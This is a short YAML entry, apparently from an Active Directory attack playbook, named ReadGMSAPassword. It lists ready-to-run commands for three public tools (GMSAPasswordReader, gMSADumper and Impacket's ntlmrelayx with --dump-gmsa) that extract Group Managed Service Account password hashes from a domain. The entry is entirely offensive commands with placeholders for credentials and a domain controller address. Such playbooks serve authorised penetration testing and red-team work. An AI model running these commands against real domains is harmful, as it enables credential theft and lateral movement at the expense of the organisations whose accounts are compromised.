name: ReadGMSAPassword
description: Read Group Managed Service Account password hash
commands:
- '# GMSAPasswordReader (C#)'
- GMSAPasswordReader.exe --accountname '<GMSA_NAME>'
- ''
- '# gMSADumper (Python)'
- gMSADumper.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>'
- ''
- '# Impacket ntlmrelayx'
- ntlmrelayx.py -t ldaps://<DC_IP> --dump-gmsa
opsec: []
references: []
